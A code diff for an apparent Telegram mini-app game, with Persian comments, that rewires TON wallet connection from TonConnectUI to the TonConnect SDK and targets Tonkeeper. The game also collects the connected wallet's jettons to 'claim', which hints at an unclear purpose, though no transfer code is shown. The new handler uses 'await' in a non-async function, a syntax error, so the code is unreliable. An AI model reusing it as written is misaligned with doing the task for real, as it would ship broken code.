@@ -5,36 +5,30 @@ let jettonsToClaim = [];
 let currentIndex = 0;
 
 // ---------- Connect Wallet ----------
+const connector = new TonConnectSDK.TonConnect({
+    manifestUrl: "https://emperator16.github.io/miniapp/tonconnect-manifest.json"
+});
+
 document.getElementById("connectBtn").onclick = () => {
-    try {
-        ui = new TonConnectUI.TonConnectUI({
-            manifestUrl: "https://emperator16.github.io/miniapp/manifest.json"
+    const walletInfoList = await connector.getWallets();
+
+    // انتخاب Tonkeeper
+    const tonkeeperInfo = walletInfoList.find(w => w.name.toLowerCase().includes("tonkeeper"));
+
+    if (tonkeeperInfo) {
+        connector.connect({
+            universalLink: tonkeeperInfo.universalLink,
+            bridgeUrl: tonkeeperInfo.bridgeUrl
         });
-
-        // نمایش اتصال به والت (modal خود TonConnect)
-        ui.walletSelect(); 
-
-        // event listener برای تغییر وضعیت Wallet
-        ui.onStatusChange((status) => {
-            if (status.type === 'connected') {
-                walletAddress = status.account.address;
-                console.log("Wallet connected:", walletAddress);
-                alert("Wallet connected: " + walletAddress);
-
-                document.getElementById("connectDiv").style.display = "none";
-                document.getElementById("gameDiv").style.display = "block";
-
-                fetchUserJettons(walletAddress).then(jettons => {
-                    jettonsToClaim = jettons;
-                });
-            }
-        });
-
-    } catch(e) {
-        console.error("Connection failed:", e);
-        alert("Wallet connection failed. Make sure you are in Telegram or on mobile with Tonkeeper.");
     }
 };
+
+// دنبال کردن وضعیت اتصال
+connector.onStatusChange(info => {
+    if (info) {
+        console.log("Connected:", info.account.address);
+    }
+});
 
 // ---------- Play Game ----------
 document.getElementById("playBtn").onclick = () => {
@@ -128,3 +122,4 @@ async function fetchUserJettons(address) {
         {address: '0:def456...', amount: 1}
     ];
 }
+
